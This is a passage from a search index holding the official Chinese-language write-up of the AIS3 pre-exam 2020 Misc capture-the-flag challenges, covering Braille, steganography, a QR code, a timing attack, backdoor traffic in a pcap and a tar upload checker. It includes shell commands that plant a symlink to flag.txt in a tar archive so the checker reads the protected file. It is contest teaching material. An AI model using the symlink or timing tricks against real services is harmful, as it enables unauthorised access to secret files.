\uff0c\u9019\u908a\u53ef\u4ee5\u4f7f\u7528 ln \u4f86\u5c07 guess.txt \u9023\u7d50\u5230 flag.txt \uff0c\u9019\u6a23\u958b\u6a94\u78ba\u8a8d\u6642\u5c31\u6703\u958b\u5230\u76f8\u540c\u7684\u6a94\u6848\u3002 ln -s ../flag.txt guess.txt tar -cf Shichirou.tar guess.txt Note \u9019\u984c\u5176\u5be6\u662f AIS3 pre-exam 2016 misc 3\uff0c\u53ea\u6709\u984c\u76ee\u6558\u8ff0\u3001flag\u3001\u4ee5\u53ca\u5bb6\u76ee\u9304\u7684\u4f4d\u7f6e\u6709\u66f4\u6539\uff0c\u6c92\u60f3\u5230\u89e3\u51fa\u4f86\u7684\u4eba\u597d\u5c11QQ \ud83d\udc51 Saburo Description Spell you flag and fight with me. PS. flag is printable characters with AIS3{\u2026} Solution \u9019\u984c\u8003\u7684\u662f timing attack\uff0c\u96a8\u8457\u731c\u5c0d\u7684\u5b57\u8d8a\u591a\uff0c\u6240\u9700\u7684\u6642\u9593\u5c31\u6703\u8d8a\u4e45\uff0c\u53ef\u4ee5\u5229\u7528\u9019\u500b\u7279\u6027\u9010\u5b57\u6aa2\u9a57\uff0c\u627e\u51fa\u53ef\u80fd\u6027\u6700\u9ad8\u7684\u5b57\u3002\u4e0d\u904e\u6aa2\u9a57\u4e00\u500b\u5b57\u5143\u6240\u9700\u7684\u6642\u9593\u662f\u6d6e\u52d5\u7684\uff0c\u96d6\u8aaa\u591a\u6aa2\u9a57\u4e00\u500b\u5b57\u7684\u78ba\u6703\u82b1\u6bd4\u8f03\u591a\u6642\u9593\uff0c\u4f46\u6d6e\u52d5\u7684\u7bc4\u570d\u537b\u6703\u8d8a\u4f86\u8d8a\u5927\uff0c\u6aa2\u9a57\u4e00\u500b\u5b57\u5143\u6240\u9700\u7684\u6642\u9593\u70ba 11~15 ms\uff0c\u5047\u8a2d\u6aa2\u9a57\u5230\u7b2c 10 \u500b\u5b57\u5143\uff0c\u5f97\u5230\u7684\u7d50\u679c\u6700\u5feb\u8ddf\u6700\u6162\u53ef\u4ee5\u5dee\u5230 50 ms\uff0c\u9019\u500b\u554f\u984c\u6703\u589e\u52a0\u6aa2\u9a57\u7684\u96e3\u6613\u5ea6\u3002 \u70ba\u4e86\u89e3\u6c7a\u4e0a\u8ff0\u554f\u984c\uff0c\u5fc5\u9808\u4f7f\u7528\u4e00\u4e9b\u6280\u5de7\u4f86\u907f\u514d\u8aa4\u5224\uff0c\u9996\u5148\u662f\u8981\u78ba\u5b9a\u54ea\u500b\u7b54\u6848\u662f\u932f\u7684\uff0c\u7576\u4e0d\u65b7\u5f80\u4e0a\u589e\u52a0\u6642\uff0c\u5f97\u5230\u7684\u6578\u5b57\u5982\u679c\u6c92\u6709\u7e7c\u7e8c\u589e\u52a0\u5c31\u4ee3\u8868\u524d\u9762\u53ef\u80fd\u6709\u5b57\u5143\u731c\u932f\uff0c\u9019\u908a\u53ef\u4ee5\u5c07\u524d\u5e7e\u500b\u5b57\u7684\u5dee\u503c\u5e73\u5747\uff0c\u4e26\u8207\u73fe\u5728\u7684\u5dee\u503c\u505a\u6bd4\u8f03 (\u4f8b\u5982\u5224\u65b7\u73fe\u5728\u7684\u5dee\u503c\u662f\u5426\u5927\u65bc\u539f\u5dee\u503c\u7684\u4e00\u534a)\uff0c\u5982\u679c\u767c\u73fe\u662f\u932f\u7684\uff0c\u5c31\u5f80\u524d\u4e00\u500b\u5b57\u5143\u91cd\u627e\uff0c\u9664\u6b64\u4e4b\u5916\uff0c\u4e5f\u53ef\u4ee5\u5c07\u540c\u500b\u5b57\u4e32\u9001\u591a\u6b21\u4f86\u53d6\u5f97\u5e73\u5747\u503c\uff0c\u4f86\u6c42\u5f97\u6bd4\u8f03\u7a69\u5b9a\u7684\u7b54\u6848\u3002 Note \u9019\u984c\u539f\u672c\u7684\u8a2d\u8a08\u662f\u4f7f\u7528 cpu time \u4f86\u8a08\u7b97\uff0c\u4f46\u6bd4\u8cfd\u958b\u59cb\u5f8c\uff0c\u56e0\u70ba\u5f88\u591a\u4eba\u4e00\u8d77\u6e2c\uff0c\u5f97\u5230\u7684\u6642\u9593\u5176\u5be6\u4e0d\u592a\u7a69\u5b9a\uff0c\u56e0\u6b64\u6bd4\u8cfd\u958b\u59cb\u5f8c\u5e7e\u5c0f\u6642\u6211\u5c31\u5c07\u984c\u76ee\u56de\u50b3\u7684\u6642\u9593\u6539\u6210 time += 11 + random()%5 \u4e86\uff0c\u4f46\u8cfd\u4e2d\u8a31\u591a\u540c\u5b78\u4f9d\u7136\u8a8d\u70ba\u662f\u7cfb\u7d71\u4e0d\u7a69\u5b9a\u9020\u6210\u7684\uff0c\u4e26\u6c92\u6709\u767c\u73fe\u9019\u984c\u771f\u6b63\u7684\u8003\u9ede\u4e26\u52a0\u4ee5\u6539\u5584\uff0c\u6709\u9ede\u53ef\u60dcQQ\u3002 \ud83d\udc7b Soy Description Here is your flag. Oops, my bad. Solution \u9019\u984c\u53ef\u4ee5\u53c3\u8003\u82f1\u6587\u7248 Wiki \uff0c\u5728\u984c\u76ee\u7684 QRcode \u4e2d\uff0c\u88ab\u906e\u4f4f\u7684\u90e8\u5206\u662f\u5bb9\u932f\u5340\u584a\uff0c\u683c\u5f0f\u5340\u584a\u4ee5\u53ca\u8cc7\u6599\u5340\u584a\u90fd\u662f\u6b63\u5e38\u7684\uff0c\u5982\u679c\u4e0d\u7ba1\u5bb9\u932f\u7684\u8a71\uff0c\u88e1\u9762\u5b58\u7684\u8cc7\u6599\u662f\u53ef\u4ee5\u6b63\u78ba\u5730\u89e3\u958b\u7684\uff0c\u800c\u5e73\u5e38\u4f7f\u7528\u7684\u89e3\u78bc\u7a0b\u5f0f\u90fd\u6703\u8003\u616e\u5bb9\u932f\u7684\u90e8\u5206\uff0c\u56e0\u6b64\u4e0d\u6703\u8f38\u51fa\u5132\u5b58\u7684\u8cc7\u6599\u3002\u9019\u984c\u53ef\u4ee5\u4f7f\u7528 \u7dda\u4e0a\u5de5\u5177 \u6216\u662f\u8ddf\u8457\u683c\u5f0f\u624b\u89e3\uff0c\u89e3\u7b54\u8acb\u53c3\u8003\u4e0b\u5716\uff1a Note \u9019\u984c\u662f\u60f3\u8003 QRcode \u7684\u683c\u5f0f\u7684\uff0c\u53ea\u8981\u770b\u61c2 QRcode \u7684\u8a2d\u8a08\u5c31\u53ef\u4ee5\u9806\u5229\u89e3\u51fa\u4f86\uff0c\u7576\u6642\u6c92\u767c\u73fe\u6709\u7dda\u4e0a\u5de5\u5177\u53ef\u4ee5\u7528\uff0c\u4e5f\u6c92\u767c\u73fe HSCTF 2020 N-95 \u624d\u525b\u51fa\u904e\u985e\u4f3c\u7684\u984c\u76ee\uff0c\u7d50\u679c\u5c31\u88ab\u77ac\u9593\u89e3\u51fa\u4f86\u4e86QQ \ud83e\uddf8 Clara Description I did nothing special today. >_< Solution \u9019\u984c\u7d66\u4e86\u4e00\u5305 100 mb \u7684 pcap\uff0c\u5148\u5206\u6790\u4e00\u4e0b\u50b3\u8f38\u7684\u7a2e\u985e (wireshark \u5728 statics -> conversations -> tcp)\uff0c\u53ef\u4ee5\u767c\u73fe\u6709\u5169\u7b46\u672c\u6a5f\u8ddf 140.112.42.47 \u7684\u50b3\u8f38\u91cf\u7279\u5225\u5927\uff0c\u4e14\u9019\u5169\u7b46\u662f\u552f\u4e00\u672a\u52a0\u5bc6\u7684 (\u53ef\u4ee5\u7528 http \u904e\u6ffe\u51fa\u4f86)\u3002 follow \u5176\u4e2d\u4e00\u7b46\uff0c\u53ef\u4ee5\u770b\u5230\u50b3\u905e\u8cc7\u6599\u5982\u4e0b\u5716\uff0c\u6bd4\u8f03\u4e00\u4e0b\u9019\u5169\u7b46\u53ef\u4ee5\u767c\u73fe\uff0c\u958b\u982d\u90fd\u662f\u50b3 deadbeeffaceb00c \uff0c\u5f8c\u9762\u624d\u4e0d\u4e00\u6a23\uff0c\u524d 8 bytes \u5be6\u969b\u4e0a\u662f\u5728\u505a key exchange\uff0c\u800c key \u7684\u9577\u5ea6\u662f 8 bytes\uff0c\u9060\u7aef\u6703\u5c07 key XOR deadbeeffaceb00c \uff0c\u672c\u5730\u7aef\u6536\u5230\u5f8c\u518d\u89e3\u5bc6\u5f97\u5230 key\uff0c\u63a5\u8457\u5f8c\u9762\u7684\u50b3\u8f38\u90fd\u662f\u7d93\u7531\u8a72 key \u505a XOR \u5f8c\u50b3\u8f38\u7684\u3002 \u5176\u5be6\u7ffb\u5230\u5f8c\u9762\u53ef\u4ee5\u767c\u73fe\u6709\u4e9b\u5340\u6bb5\u662f\u53ef\u4ee5\u770b\u5230\u5305\u542b AIS3{NO} \u548c xSECRETx \u7684\u5b57\u4e32\uff0c\u9019\u5206\u5225\u662f\u5169\u6b21\u6240\u4f7f\u7528\u7684 key\uff0c\u56e0\u70ba\u50b3\u905e\u7684\u8cc7\u6599\u4e2d\u5305\u542b 0x00 \uff0c\u6240\u4ee5\u7d93\u904e XOR \u5f8c\u53ef\u4ee5\u76f4\u63a5\u770b\u5230\u539f\u672c\u7684 key\uff0c\u5373\u4fbf\u6c92\u6709\u767c\u73fe\u524d\u9762\u662f key exchange\uff0c\u4e00\u6a23\u53ef\u4ee5\u5f9e\u9019\u908a\u63a8\u6572\u51fa\u52a0\u5bc6\u65b9\u5f0f\u4ee5\u53ca key\u3002 \u63a5\u8457\u8981\u89e3\u5bc6\u6240\u50b3\u8f38\u7684\u8cc7\u6599\uff0c\u89c0\u5bdf\u4e00\u4e0b\u683c\u5f0f\u53ef\u4ee5\u767c\u73fe\u5f8c\u9762\u7684\u8cc7\u6599\u90fd\u662f\u7531 4 bytes + n bytes + 4 bytes + m bytes \u7d44\u6210\uff0c\u5176\u4e2d n \u90fd\u6bd4\u8f03\u5c0f\uff0c\u800c m \u90fd\u975e\u5e38\u5927\uff0c\u9019\u908a\u53ef\u4ee5\u731c\u6e2c m \u662f\u8cc7\u6599\u672c\u8eab\uff0c\u800c n \u5247\u662f\u8ddf\u8a72\u8cc7\u6599\u6709\u95dc\u7684 metadata\uff0c\u524d\u9762\u7684 4 bytes \u5247\u53ef\u80fd\u662f\u9577\u5ea6\u3002\u56e0\u70ba\u4e00\u822c\u5f8c\u9580\u900f\u904e socket \u5728\u50b3\u8f38\u6642\uff0c\u5fc5\u9808\u5148\u6e9d\u901a\u597d\u683c\u5f0f\uff0cC2 Server \u624d\u80fd\u9806\u5229\u89e3\u8b80 backdoor \u50b3\u904e\u4f86\u7684\u8a0a\u606f\uff0c\u5c24\u5176\u662f\u5728\u50b3\u9001\u6a94\u6848\u9019\u7a2e\u4e0d\u56fa\u5b9a\u5927\u5c0f\u7684\u8cc7\u6599\uff0c\u4e00\u5b9a\u8981\u5148\u8b1b\u597d\u9577\u5ea6\u6216\u662f\u524d\u5f8c\u7db4\u3002 \u7d93\u904e\u89e3\u5bc6\u5f8c\u53ef\u4ee5\u767c\u73fe\uff0c4 bytes \u70ba Little Endian \u8868\u793a\u7684\u9577\u5ea6 (n / m)\uff0c\u5f8c\u9762 n / m bytes \u5247\u5206\u5225\u662f\u6a94\u540d\u4ee5\u53ca\u6a94\u6848\u5167\u5bb9\uff0c\u5176\u4e2d\u7b2c\u4e8c\u6b21\u5c0d\u8a71\u7684\u7b2c\u56db\u5f35\u5716\u7247\u5373\u70ba Flag\u3002 Note \u6211\u6700\u8fd1\u7684\u7814\u7a76\u9805\u76ee\u662f\u4ee5\u55ae\u7d14\u5229\u7528 monitor \u9304\u5230\u7684\u8cc7\u8a0a\uff0c\u4e14\u76e1\u91cf\u907f\u514d\u76f4\u63a5\u5206\u6790 binary \u7684\u65b9\u5f0f\u4f86\u5206\u6790 malware\uff0c\u6240\u4ee5\u60f3\u8a66\u8457\u628a\u5404\u7a2e\u7dda\u7d22\u532f\u96c6\u5728\u4e00\u8d77\u51fa\u6210\u984c\u76ee\uff0c\u6211\u6700\u5f8c\u63a1\u7528\u4e86 pcap \u7684\u65b9\u5f0f\uff0c\u56e0\u70ba\u6bd4\u8f03\u597d\u5206\u6790\uff0c\u5c0d\u65b0\u624b\u4e5f\u6bd4\u8f03\u5bb9\u6613\u4e0a\u624b\u3002\u56e0\u70ba\u53ea\u6709 pcap\uff0c\u6240\u4ee5\u5fc5\u9808\u7d66\u8db3\u7dda\u7d22\uff0c\u6211\u9078\u64c7\u900f\u904e http \u7684\u65b9\u5f0f\u50b3\u905e\u6578\u5f35\u5927\u578b\u5716\u7247\uff0c\u5982\u679c\u6709\u4ed4\u7d30\u5206\u6790\u904e\u5167\u5bb9\u7684\u8a71\uff0c\u61c9\u8a72\u662f\u53ef\u4ee5\u5f88\u5feb\u627e\u5230\u53ef\u7591\u7684\u6d41\u91cf\u3002 \u63a5\u8457\u662f\u52a0\u5bc6\u7684\u90e8\u5206\uff0c\u76f4\u63a5\u770b\u7684\u8a71\u662f\u770b\u4e0d\u51fa\u5230\u5e95\u5728\u50b3\u4ec0\u9ebc\uff0c\u56e0\u6b64\u53ef\u4ee5\u77e5\u9053\u662f\u6709\u52a0\u5bc6\u904e\u7684\uff0c\u554f\u984c\u662f\u7528\u4ec0\u9ebc\u65b9\u5f0f\u4ee5\u53ca\u4ec0\u9ebc key \u52a0\u5bc6\uff0c\u5982\u679c\u662f\u76f4\u63a5\u4f7f\u7528\u8a2d\u8a08\u6642\u5c31\u5beb\u597d\u7684 key \u52a0\u5bc6\u7684\u8a71\uff0c\u6211\u89ba\u5f97\u9019\u984c\u5c31\u592a\u901a\u9748\u4e86\uff0c\u56e0\u6b64\u6211\u7528\u4e86\u6bd4\u8f03\u7c21\u55ae\u6613\u61c2\u7684\u65b9\u5f0f\u4f86\u505a key exchange\uff0c\u70ba\u4e86\u907f\u514d\u53c3\u8cfd\u8005\u6c92\u6709\u767c\u73fe\uff0c\u6211\u6545\u610f\u5c07 backdoor \u65b7\u7dda\u4e26\u91cd\u65b0\u9023\u7dda\uff0c\u4e14\u5169\u6b21\u4f7f\u7528\u4e0d\u540c\u7684 key \u4f86\u52a0\u5bc6\uff0c\u900f\u904e\u89c0\u5bdf\u521d\u59cb\u7684 deadbeeffaceb00c \u61c9\u8a72\u5c31\u53ef\u4ee5\u63a8\u6572\u51fa\u4f86\u4e86 (\u5176\u4e2d\u4e00\u4f4d\u89e3\u958b\u7684\u540c\u5b78\u4e5f\u78ba\u5be6\u662f\u9019\u9ebc\u505a\u7684)\u3002\u53e6\u5916 key \u7684\u9577\u5ea6\u8a2d\u5b9a\u70ba 8 bytes \u4e5f\u662f\u4e00\u500b\u7dda\u7d22\uff0c\u56e0\u70ba\u5716\u7247\u6703\u6709\u8a31\u591a 0x00 \u6240\u4ee5\u52a0\u5bc6\u5f8c\u53ef\u4ee5\u76f4\u63a5\u770b\u5230 key \u7684\u5167\u5bb9\uff0c\u5c07 wireshark \u5207\u5230 hex mode \u4ee5\u5f8c\uff0c\u5b83\u662f\u4ee5\u6bcf 16 bytes \u505a\u5c0d\u9f4a\u7684\uff0c\u4ed4\u7d30\u89c0\u5bdf\u5c31\u53ef\u4ee5\u767c\u73fe\u540c\u4e00\u5217\u6703\u51fa\u73fe\u591a\u500b\u540c\u6a23\u5b57\u5143\uff0c\u5168\u90e8\u5f59\u96c6\u8d77\u4f86\u5f8c\u5c31\u662f\u8a72\u6b21\u7684 key \u4e86\u3002 \u6700\u5f8c\u662f\u50b3\u8f38\u5167\u5bb9\u7684\u90e8\u5206\uff0c\u5728\u900f\u904e socket \u50b3\u8f38\u6642\uff0c\u56e0\u70ba\u4e0d\u77e5\u9053\u5c0d\u65b9\u8981\u50b3\u4ec0\u9ebc\u5167\u5bb9\uff0c\u6240\u4ee5\u5fc5\u9808\u5148\u8a02\u597d\u4e00\u4e9b\u50b3\u8f38\u7684\u898f\u5247\uff0c\u5426\u5247\u5c0d\u65b9\u6536\u5230\u7684\u5c31\u53ea\u662f\u4e00\u5927\u7247\u7684\u8cc7\u6599\u800c\u5df2\uff0c\u5b8c\u5168\u4e0d\u77e5\u9053\u600e\u9ebc\u5207\u5272\u3002\u4e00\u822c\u4f86\u8aaa\u6703\u5206\u6210\u5169\u7a2e\uff0c\u7b2c\u4e00\u7a2e\u662f\u65e2\u5b9a\u7684\u683c\u5f0f\uff0c\u6700\u524d\u9762\u7684 key exchange \u5c31\u5c6c\u65bc\u9019\u7a2e\uff0c\u4e8b\u5148\u5c31\u8b1b\u597d backdoor \u50b3 8 bytes\uff0c\u800c C2 \u56de 8 bytes\uff0c\u7b2c\u4e8c\u7a2e\u5247\u662f\u4e0d\u56fa\u5b9a\u9577\u5ea6\u7684\uff0c\u5e38\u6703\u7528\u5728\u50b3\u6a94\u6848\u6216\u5b57\u4e32\u7684\u6642\u5019\uff0c\u53ef\u4ee5\u50cf\u9019\u984c\u4e00\u6a23\uff0c\u5148\u50b3\u4e00\u500b\u56fa\u5b9a\u9577\u5ea6 (\u9019\u984c\u70ba 4 bytes) \u8868\u793a\u9577\u5ea6\uff0c\u63a5\u8457\u5c31\u53ea\u8981\u63a5\u6536\u8a72\u9577\u5ea6\u7684\u8cc7\u6599\u5373\u53ef\uff0c\u4e5f\u53ef\u4ee5\u900f\u904e\u7279\u6b8a\u524d\u5f8c\u7db4\uff0c\u4f8b\u5982 <BEGIN>...<END> \u4f86\u6a19\u793a\u51fa\u8cc7\u6599\u7684\u7bc4\u570d\u3002 \u7d9c\u5408\u4ee5\u4e0a\u5e7e\u500b\u6982\u5ff5\uff0c\u5c31\u53ef\u4ee5\u9806\u5229\u7684\u89e3\u958b\u9019\u984c\u4e86\uff0c\u4e0d\u904e\u4e00\u76f4\u5230\u6700\u5f8c\u6211\u4e1f\u51fa\u4e00\u5806\u63d0\u793a\u624d\u6709\u4eba\u89e3\u958bQQ\uff0c\u6211\u89ba\u5f97\u53ef\u80fd\u662f\u56e0\u70ba\u540c\u5b78\u5c0d backdoor \u7814\u7a76\u8f03\u5c11\uff0c\u56e0\u6b64\u5c0d\u8a31\u591a\u7dda\u7d22\u6bd4\u8f03\u4e0d\u654f\u611f\u3002\u5176\u5be6\u9019\u984c\u6211\u5728\u51fa\u5b8c\u5f8c\u9084\u6709\u62ff\u7d66\u5728 Forensic \u65b9\u9762\u6709\u7814\u7a76\u7684\u524d\u8f29\u770b\u770b\uff0c\u6211\u5011\u89ba\u5f97\u7dda\u7d22\u7d66\u7684\u5920\u591a\uff0c\u61c9\u8a72\u662f\u4e0d\u6703\u592a\u901a\u9748\uff0c\u4ed6\u6709\u5efa\u8b70\u6211\u4e00\u4e9b\u964d\u4f4e\u96e3\u5ea6\u7684\u65b9\u6cd5\uff0c\u4f8b\u5982\u53ef\u4ee5\u76f4\u63a5\u5728\u6d41\u91cf\u4e2d\u50b3\u905e\u6574\u500b backdoor\uff0c\u4e4b\u5f8c\u518d\u900f\u904e backdoor \u505a\u4e4b\u5f8c\u7684\u50b3\u8f38\uff0c\u4e0d\u904e\u89ba\u5f97\u9019\u6a23\u5c31\u8b8a\u6210\u55ae\u7d14\u7684 dump binary \u7136\u5f8c reverse \u4e86\uff0c\u6709\u9ede\u7121\u8da3\uff0c\u6240\u4ee5\u624d\u4fdd\u7559\u4e86\u539f\u59cb\u7684\u4f5c\u6cd5\u3002","title":"AIS3 pre-exam 2020 Misc \u5b98\u65b9 Writeup"},{"location":"Writeups/2020/AIS3_pre-exam/#ais3-pre-exam-2020-misc-writeup","text":"","title":"AIS3 pre-exam 2020 Misc \u5b98\u65b9 Writeup"},{"location":"Writeups/2020/AIS3_pre-exam/#piquero","text":"","title":"\ud83d\udca4 Piquero"},{"location":"Writeups/2020/AIS3_pre-exam/#description","text":"I can\u2019t see the flag. Where is it?","title":"Description"},{"location":"Writeups/2020/AIS3_pre-exam/#solution","text":"\u9019\u984c\u662f\u7de8\u78bc\u7684\u984c\u76ee\uff0c\u7528\u7684\u662f Braille\uff0c\u4e5f\u5c31\u662f\u751f\u6d3b\u4e2d\u5e38\u898b\u7684\u76f2\u4eba\u9ede\u5b57\uff0c\u9019\u984c\u6703\u9047\u5230\u7684\u554f\u984c\u662f Braille \u6709\u591a\u7a2e\u8a9e\u7cfb\uff0c\u6703\u9700\u8981\u63a8\u6572\u4e00\u4e0b\uff0c\u4e0d\u904e Flag \u662f\u82f1\u3001\u6578\u3001\u7b26\u865f\u7d44\u6210\uff0c\u4e14\u7db2\u8def\u4e0a\u591a\u6578\u5de5\u5177\u4e5f\u662f\u4ee5\u82f1\u6587\u70ba\u4e3b\uff0c\u61c9\u8a72\u883b\u5bb9\u6613\u8a66\u51fa\u4f86\u7684(?)\u3002 \u89e3\u6cd5\u7684\u90e8\u5206\uff0c\u53ea\u8981\u53c3\u8003\u82f1\u6587\u7248 wiki \u5c31\u53ef\u4ee5\u9010\u5b57\u89e3\u958b\u4e86\uff0c\u89e3\u7b54\u5982\u4e0b\u5716\uff1a","title":"Solution"},{"location":"Writeups/2020/AIS3_pre-exam/#note","text":"\u9019\u984c\u7684\u96e3\u5ea6\u5b9a\u4f4d\u662f\u6700\u7c21\u55ae\u7684\uff0c\u60f3\u883b\u4e45\u8981\u51fa\u4ec0\u9ebc\u984c\u76ee\u7684\uff0c\u5f8c\u4f86\u770b\u4e86\u7db2\u8def\u4e0a\u5404\u7a2e\u77e5\u8b58\u578b\u983b\u9053\uff0c\u525b\u597d\u770b\u5230 \u557e\u557e\u978b\u5728\u8b1b\u76f2\u4eba\u9ede\u5b57 \uff0c\u89ba\u5f97\u633a\u6709\u8da3\u7684\uff0c\u800c\u4e14\u662f\u540c\u5b78\u65e5\u5e38\u751f\u6d3b\u4e2d\u90fd\u898b\u904e\uff0c\u537b\u6c92\u6ce8\u610f\u904e\u7684\u7de8\u78bc\uff0c\u5c31\u51fa\u4e86\u9019\u984c\u3002 \u5728\u6bd4\u8cfd\u904e\u7a0b\u4e2d\uff0c\u5f88\u591a\u540c\u5b78\u90fd\u4f7f\u7528\u7dda\u4e0a\u5de5\u5177\u4f86\u89e3\uff0c\u5f97\u5230\u985e\u4f3c\u4e0b\u5716\u7684\u7d50\u679c\uff0c\u96d6\u7136\u8aaa\u770b\u5230\u9019\u500b\u518d\u901a\u9748\u4e00\u4e0b\u5c31\u77e5\u9053 Flag \u4e86(\u4e5f\u78ba\u5be6\u6709\u4e9b\u540c\u5b78\u662f\u7528\u901a\u9748\u7684)\uff0c\u4e0d\u904e\u5728\u9019\u500b\u7d50\u679c\u4e2d\u53ef\u4ee5\u767c\u73fe\uff0c AIS \u524d\u9762\u90fd\u6709\u4e00\u500b\u7b26\u865f\uff0c\u4e14\u6bd4\u8cfd\u6709\u516c\u544a\u683c\u5f0f\u70ba AIS3{...} \uff0c\u53ef\u63a8\u6e2c\u8a72\u7b26\u865f\u70ba\u5927\u5beb\u5b57\u6bcd\u7684\u524d\u7db4\u7b26\u865f\uff0c\u800c AIS3 \u5f8c\u65b9\u7684\u5169\u500b\u7b26\u865f\u5728\u524d\u5f8c\u90fd\u6709\uff0c\u61c9\u70ba {} \uff0c\u53ef\u5f97 AIS3{I-feel-sleepy-Good-Night!!!} \uff0c\u4f46\u9019\u9084\u662f\u932f\u7684\uff0c\u4e4b\u5f8c\u89c0\u5bdf\u4e00\u4e0b\u4e00\u822c Flag \u7684\u5beb\u6cd5\uff0c\u61c9\u8a72\u5c31\u53ef\u4ee5\u767c\u73fe\u8981\u5c07 - \u6539\u6210 _ \u4e86\u3002","title":"Note"},{"location":"Writeups/2020/AIS3_pre-exam/#karuego","text":"","title":"\ud83d\udc25 Karuego"},{"location":"Writeups/2020/AIS3_pre-exam/#description_1","text":"Students who fail to summon will be dropped out.","title":"Description"},{"location":"Writeups/2020/AIS3_pre-exam/#solution_1","text":"\u5148\u7528 binwalk \u6383\u4e00\u4e0b\u53ef\u4ee5\u767c\u73fe\u5716\u7247\u5f8c\u9762\u6709\u4e00\u500b\u52a0\u5bc6\u904e\u5f8c\u7684\u58d3\u7e2e\u6a94\uff0c\u63a5\u8457\u7528 lsb \u6383\u4e00\u4e0b\u539f\u5716\u53ef\u4ee5\u627e\u5230 The key is : lafire \u7684\u5b57\u4e32\uff0c\u4f7f\u7528 lafire \u4f5c\u70ba\u5bc6\u78bc\u89e3\u958b\u58d3\u7e2e\u6a94\u5373\u53ef\u5f97\u5230\u4e0b\u5716\u3002","title":"Solution"},{"location":"Writeups/2020/AIS3_pre-exam/#note_1","text":"\u9019\u984c\u662f\u60f3\u51fa\u7c21\u55ae\u7684 stego \u984c\uff0c\u6240\u4ee5\u7d9c\u5408\u4e86\u5404\u7a2e\u5716\u7247\u5e38\u7528\u7684\u6280\u5de7\u4f86\u51fa\u984c\uff0c\u4e0a\u8ff0\u89e3\u6cd5\u53ea\u662f\u5176\u4e2d\u4e00\u7a2e\uff0c\u5176\u5be6\u52a0\u5bc6\u7684\u58d3\u7e2e\u6a94\u53ef\u4ee5\u76f4\u63a5\u4f7f\u7528 rockyou.txt \u6216\u662f John the Ripper \u7b49\u5de5\u5177\u66b4\u529b\u7834\u89e3\uff0c\u53e6\u5916\u58d3\u7e2e\u6a94\u7684\u6a94\u6848\u7d50\u69cb\u6c92\u6709\u52a0\u5bc6\uff0c\u53ef\u4ee5\u5728\u5176\u4e2d\u627e\u5230\u4e00\u5f35\u5716\u7247 ( 3a66fa5887bcb740438f1fb49f78569cb56e9233_hq.jpg )\uff0c\u641c\u5c0b\u4e00\u4e0b\u9019\u5f35\u5716\u7684\u539f\u5716\uff0c\u518d\u4f7f\u7528 pkcrack \u505a known-plaintext attack \u4e5f\u53ef\u4ee5\u89e3\u958b\u3002","title":"Note"},{"location":"Writeups/2020/AIS3_pre-exam/#shichirou","text":"","title":"\ud83d\udc7f Shichirou"},{"location":"Writeups/2020/AIS3_pre-exam/#description_2","text":"Don\u2019t cheat!!! #!/usr/bin/env python3 import os import sys import tempfile import subprocess import resource resource . setrlimit ( resource . RLIMIT_FSIZE , ( 65536 , 65536 )) os . chdir ( os . environ [ 'HOME' ]) size = int ( sys . stdin . readline () . rstrip ( ' \\r\\n ' )) if size > 65536 : print ( 'File is too large.' ) quit () data = sys . stdin . read ( size ) with tempfile . NamedTemporaryFile ( mode = 'w+' , suffix = '.tar' , delete = True , dir = '.' ) as tarf : with tempfile . TemporaryDirectory ( dir = '.' ) as outdir : tarf . write ( data ) tarf . flush () try : subprocess . check_output ([ '/bin/tar' , '-xf' , tarf . name , '-C' , outdir ]) except : print ( 'Broken tar file.' ) raise try : a = subprocess . check_output ([ '/usr/bin/sha1sum' , 'flag.txt' ]) b = subprocess . check_output ([ '/usr/bin/sha1sum' , os . path . join ( outdir , 'guess.txt' )]) a = a . split ( b ' ' )[ 0 ] b = b . split ( b ' ' )[ 0 ] assert len ( a ) == 40 and len ( b ) == 40 if a != b : raise Exception ( 'sha1' ) except : print ( 'Different.' ) raise print ( open ( 'flag.txt' , 'r' ) . readline ())","title":"Description"},{"location":"Writeups/2020/AIS3_pre-exam/#solution_2","text":"\u9019\u984c\u662f\u8981\u4e0a\u50b3\u4e00\u500b tar \u6a94\uff0c\u88e1\u9762\u8981\u6709\u5beb\u6709 Flag \u7684 guess.txt \uff0c\u9019\u908a\u53ef\u4ee5\u4f7f\u7528 ln \u4f86\u5c07 guess.txt \u9023\u7d50\u5230 flag.txt \uff0c\u9019\u6a23\u958b\u6a94\u78ba\u8a8d\u6642\u5c31\u6703\u958b\u5230\u76f8\u540c\u7684\u6a94\u6848\u3002 ln -s ../flag.txt guess.txt tar -cf Shichirou.tar guess.txt","title":"Solution"},{"location":"Writeups/2020/AIS3_pre-exam/#note_2","text":"\u9019\u984c\u5176\u5be6\u662f AIS3 pre-exam 2016 misc 3\uff0c\u53ea\u6709\u984c\u76ee\u6558\u8ff0\u3001flag\u3001\u4ee5\u53ca\u5bb6\u76ee\u9304\u7684\u4f4d\u7f6e\u6709\u66f4\u6539\uff0c\u6c92\u60f3\u5230\u89e3\u51fa\u4f86\u7684\u4eba\u597d\u5c11QQ","title":"Note"},{"location":"Writeups/2020/AIS3_pre-exam/#saburo","text":"","title":"\ud83d\udc51 Saburo"},{"location":"Writeups/2020/AIS3_pre-exam/#description_3","text":"Spell you flag and fight with me. PS. flag is printable characters with AIS3{\u2026}","title":"Description"},{"location":"Writeups/2020/AIS3_pre-exam/#solution_3","text":"\u9019\u984c\u8003\u7684\u662f timing attack\uff0c\u96a8\u8457\u731c\u5c0d\u7684\u5b57\u8d8a\u591a\uff0c\u6240\u9700\u7684\u6642\u9593\u5c31\u6703\u8d8a\u4e45\uff0c\u53ef\u4ee5\u5229\u7528\u9019\u500b\u7279\u6027\u9010\u5b57\u6aa2\u9a57\uff0c\u627e\u51fa\u53ef\u80fd\u6027\u6700\u9ad8\u7684\u5b57\u3002\u4e0d\u904e\u6aa2\u9a57\u4e00\u500b\u5b57\u5143\u6240\u9700\u7684\u6642\u9593\u662f\u6d6e\u52d5\u7684\uff0c\u96d6\u8aaa\u591a\u6aa2\u9a57\u4e00\u500b\u5b57\u7684\u78ba\u6703\u82b1\u6bd4\u8f03\u591a\u6642\u9593\uff0c\u4f46\u6d6e\u52d5\u7684\u7bc4\u570d\u537b\u6703\u8d8a\u4f86\u8d8a\u5927\uff0c\u6aa2\u9a57\u4e00\u500b\u5b57\u5143\u6240\u9700\u7684\u6642\u9593\u70ba 11~15 ms\uff0c\u5047\u8a2d\u6aa2\u9a57\u5230\u7b2c 10 \u500b\u5b57\u5143\uff0c\u5f97\u5230\u7684\u7d50\u679c\u6700\u5feb\u8ddf\u6700\u6162\u53ef\u4ee5\u5dee\u5230 50 